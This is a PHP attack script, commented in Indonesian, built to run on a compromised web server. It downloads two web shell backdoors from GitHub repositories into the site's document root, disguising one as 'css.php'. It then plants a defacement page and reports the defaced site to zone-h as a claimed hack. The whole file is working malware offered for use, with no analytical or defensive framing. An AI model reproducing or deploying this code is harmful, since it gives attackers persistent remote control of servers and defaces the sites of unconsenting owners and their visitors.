<body bgcolor="#000000">
<center><?php
echo "<font color='cyan'><b>".php_uname()."</b></font><br><font color='blue'>";
function parah($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$upload = $_SERVER['DOCUMENT_ROOT']. "/css.php";
 $config = parah("https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/cah.php");
$open = fopen($upload, 'w');
fwrite($open, $config);
fclose($open);
if(file_exists($upload)){
    echo $upload."</br>";
}else 
  echo "<font color='red'>Mampus Lu Gagal Upload Shell -_- </font>";
echo "<font color='lime'>Shell Berhasil Diupload :* .</font><br> " ;

$upload2 = $_SERVER['DOCUMENT_ROOT']. "/gelay.php";
 $config2 = parah("https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/gelay2.php");
$open2 = fopen($upload2, 'w');
fwrite($open2, $config2);
fclose($open2);
if(file_exists($upload2)){
    echo $upload2."</br>";
}else 
  echo "<font color='red'>Mampus Lu Gagal Upload Shell -_- </font>";
echo "<font color='lime'>Shell Berhasil Diupload :* .</font><br> " ;



	$web = $_SERVER['HTTP_HOST']."/LiL.html";
echo "-> Zone-h: http://$web ";  
$zh = "./Mr403Forbidden";
$ch8 = curl_init ("http://www.zone-h.com/notify/single");
curl_setopt ($ch8, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch8, CURLOPT_POST, 1);
curl_setopt ($ch8, CURLOPT_POSTFIELDS, "defacer=$zh&domain1=http://$web&hackmode=1&reason=1&submit=Send");
 
if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch8))){
                echo  " <font color='lime'>Ok</font> <br>";
                
        }else{
                echo " <font color='red'>No</font><br>";
                       
                    }
   

$uploa = $_SERVER['DOCUMENT_ROOT']. "/LiL.html";
 $confi = parah("https://raw.githubusercontent.com/forbiddenphpp/HTML2/master/edan.html");
$open = fopen($uploa, 'w');
fwrite($open, $confi);
fclose($open);
if(file_exists($uploa)){
    echo $uploa."</br>";
}else 
  echo "<font color='red'>Gagal Upload Deface</font>";
echo "<font color='lime'>Sukses Upload Deface .</font>\n " ;


?></center>

